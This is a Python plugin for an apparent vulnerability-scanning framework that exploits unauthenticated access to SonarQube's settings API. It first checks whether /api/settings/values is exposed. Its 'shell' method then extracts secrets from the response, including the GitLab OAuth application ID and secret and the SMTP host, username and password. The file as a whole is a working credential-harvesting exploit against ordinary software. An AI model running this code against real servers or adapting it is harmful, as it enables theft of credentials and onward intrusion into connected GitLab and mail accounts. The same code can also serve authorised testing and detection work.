# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "desc": "SonarQube api 未授权访问",
        "datetime": "2022-01-03"
    }

    def url(self) -> dict:
        """ 验证方法 """
        r = self.request(
            method='get',
            url='./api/settings/values',
            timeout=15
        )
        if r.status_code == 200 and 'settings' in r.text:
            return {
                'LoopholeInfo': {'app': "SonarQube"}
            }

    def attack(self):
        """ 利用方法 """
        ...

    @cli.options()
    def shell(self):
        r = self.request(
            method='get',
            url='./api/settings/values',
            timeout=15
        )
        if r.status_code == 200 and 'settings' in r.text:
            res = []
            for i in r.json()['settings']:
                if 'sonar.auth.gitlab.applicationId' == i['key']:
                    res.append({'key': i['key'], 'value': i['value']})
                elif 'sonar.auth.gitlab.url' == i['key']:
                    res.append({'key': i['key'], 'value': i['value']})
                elif 'sonar.auth.gitlab.secret' == i['key']:
                    res.append({'key': i['key'], 'value': i['value']})
                elif 'email.smtp_secure_connection.secured' == i['key']:
                    res.append({'key': i['key'], 'value': i['value']})
                elif 'email.smtp_host.secured' == i['key']:
                    res.append({'key': i['key'], 'value': i['value']})
                elif 'email.smtp_username.secured' == i['key']:
                    res.append({'key': i['key'], 'value': i['value']})
                elif 'email.smtp_password.secured' == i['key']:
                    res.append({'key': i['key'], 'value': i['value']})
                elif 'email.smtp_port.secured' == i['key']:
                    res.append({'key': i['key'], 'value': i['value']})
            return res
        else:
            return 'failure'
